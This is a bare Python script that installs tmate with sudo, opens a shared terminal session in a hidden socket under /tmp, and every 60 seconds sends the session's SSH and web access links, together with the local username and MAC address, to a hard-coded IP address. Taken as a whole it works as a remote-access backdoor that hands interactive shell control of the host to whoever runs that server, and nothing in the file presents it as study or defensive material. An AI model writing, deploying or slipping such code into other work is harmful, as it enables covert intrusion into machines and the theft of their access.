#!/bin/python3
import subprocess
import requests
import json
import time
import os
import re

def is_connected():
    try:
        response = requests.get("https://www.google.com/", timeout=5)
        return response.status_code == 200
    except requests.ConnectionError:
        return False

def get_username():
    try:
        users = os.listdir('/home/')
        return users[0] if users else 'unknown'
    except Exception as e:
        raise

def get_mac_address():
    try:
        result = subprocess.check_output(['ip', 'link', 'show'], universal_newlines=True)
        match = re.search(r'link/ether (\S+)', result)
        return match.group(1).upper() if match else "MAC address not found."
    except Exception as e:
        raise

def install_tmate():
    try:
        os.system("sudo apt -y update")
        os.system("sudo apt -y install tmate")
    except Exception as e:
        raise

def generate_new_session(session_file):
    try:
        if not os.path.exists(session_file):
            subprocess.run(f"tmate -S {session_file} new-session -d -c ~/", shell=True, check=True)
            subprocess.run(f"tmate -S {session_file} wait tmate-ready", shell=True, check=True)

        process = subprocess.Popen(f"tmate -S {session_file} display -p '#{{tmate_ssh}}'", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        session_output, _ = process.communicate()
        ssh_session = session_output.decode().strip()
        web_session = ssh_session.split('@')[0].replace('ssh ', 'https://tmate.io/t/')
        return ssh_session, web_session
    except Exception as e:
        raise

def send_payload_to_api(payload):
    try:
        url = "http://103.143.187.132:8080/api/session/"
        headers = {'Content-Type': 'application/json'}
        payload_json = json.dumps(payload)
        response = requests.post(url, headers=headers, data=payload_json)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        return False

if __name__=='__main__':
    try:
        while True:
            print("Checking internet connectivity...")
            if is_connected():
                print("Internet connection established.")
                session_file = "/tmp/.private-session.sock"

                if not os.path.exists("/usr/bin/tmate"):
                    print("Installing tmate...")
                    install_tmate()

                print("Generating new tmate session...")
                ssh_session, web_session = generate_new_session(session_file)
                if ssh_session and web_session:
                    print("Tmate session generated successfully.")
                    payload = {
                        "username": get_username(),
                        "mac_address": get_mac_address(),
                        "ssh_session": ssh_session,
                        "web_session": web_session,
                        "status": True
                    }
                    print("Sending payload to API...")
                    if send_payload_to_api(payload=payload):
                        print("Payload sent successfully.")
                    else:
                        print("Failed to send payload to API.")
                else:
                    print("Failed to generate tmate session.")
            else:
                print("No internet connection available.")
            time.sleep(60)

    except KeyboardInterrupt:
        print("Script terminated by the user.")
    except Exception as e:
        print(f"An error occurred: {e}")
